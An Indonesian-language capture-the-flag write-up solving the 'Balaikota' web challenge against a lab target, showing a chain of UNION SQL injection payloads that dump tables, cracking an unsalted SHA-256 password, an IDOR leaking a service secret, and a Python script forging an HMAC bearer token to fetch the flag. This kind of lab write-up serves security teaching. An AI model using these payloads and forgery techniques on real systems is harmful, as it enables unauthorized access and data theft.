# Writeup — Balaikota

- **Kategori:** Web
- **Poin:** 550
- **Target:** http://103.196.155.224:8102
- **Flag:** `CF2{web_balaikota_f33ebf1ecd0c30002800}`

**Deskripsi:** Satu sesi staf diduga memperoleh akses ke ekspor arsip yang seharusnya terbatas. Rekonstruksi jalur akses dan ambil bukti ekspor terakhir.

---

## Ringkasan rantai

`SQL Injection` → leak hash + kamus → `password cracking` → `broken auth / IDOR` → leak `service_secret` → `token forgery (HMAC)` → akses `/archive/export`.

---

## Langkah

### 1. Recon
Endpoint: `/cari` (pencarian), `/login`, `/api/dokumen`. Halaman `/api/dokumen` membocorkan spesifikasi target:

```
GET /archive/export  →  butuh header: Authorization: Bearer <token>
token = base64url(key_id + "." + audience + "." + expiry)
        + "." + hex(HMAC-SHA256(service_secret, key_id + "." + audience + "." + expiry))
```

Dibutuhkan 4 nilai: `key_id`, `audience`, `expiry`, `service_secret`.

### 2. SQL Injection di `/cari?q=`
Query `LIKE '%...%'` yang rentan (SQLite):

- `q='` → hasil kosong (query rusak)
- `q=' OR '1'='1` → semua baris muncul

UNION injection (3 kolom) untuk dump skema:

```
zzz' UNION SELECT 1,name,sql FROM sqlite_master WHERE type='table'-- -
```

Tabel: `audit`, `dokumen`, `ekspor`, `pengguna`.

Dump `audit` membocorkan parameter token + petunjuk kamus:

```
zzz' UNION SELECT id, peristiwa,
  username || ' :: ' || COALESCE(hash_kata_sandi,'') || ' :: ' || COALESCE(catatan,'')
  FROM audit-- -
```

Hasil penting:
- Ekspor #2 (sah): `key_id balai-arsip-01, audience arsip-balaikota, expiry 2026-11-01`
- Ekspor #5 (kedaluwarsa): `key_id balai-arsip-00, ... expiry 2025-01-01`
- Password staf dari kamus internal: `/static/kamus-kota.txt`; hash `staf.arsip` bocor.

### 3. Password cracking
Hash = SHA-256 polos. Kamus bertema Semarang (~8.786 kata: `lawangsewu`, `tahugimbal`, dll.).

```python
sha256("tahugimbal13") == b060086d4af2357288c465c338fd2dbbbc4cd6187a19274fdb3794def0cf2a13  # staf.arsip
```

Login `staf.arsip : tahugimbal13` → cookie `sesi`, redirect `/dasbor`.

### 4. IDOR di `/ekspor?id=`
Dashboard hanya menautkan ekspor milik sendiri (`id=1`), tetapi parameter `id` tidak dicek kepemilikan. `id=2` (milik `akun-arsip`) membocorkan `service_secret`:

```
key_id:         balai-arsip-01
audience:       arsip-balaikota
expiry:         2026-11-01
service_secret: aeb11a29eafb444e21a711a161a4ad92339428f5319a2656bd8584bdd46a0e7f
```

### 5. Token forgery
`service_secret` dipakai sebagai **string key** HMAC (bukan hex-decoded):

```python
import base64, hmac, hashlib
msg = "balai-arsip-01.arsip-balaikota.2026-11-01"
b64 = base64.urlsafe_b64encode(msg.encode()).decode().rstrip("=")
sig = hmac.new(b"aeb11a29eafb444e21a711a161a4ad92339428f5319a2656bd8584bdd46a0e7f",
               msg.encode(), hashlib.sha256).hexdigest()
token = b64 + "." + sig
```

```bash
curl -H "Authorization: Bearer <token>" http://103.196.155.224:8102/archive/export
# → CF2{web_balaikota_f33ebf1ecd0c30002800}
```
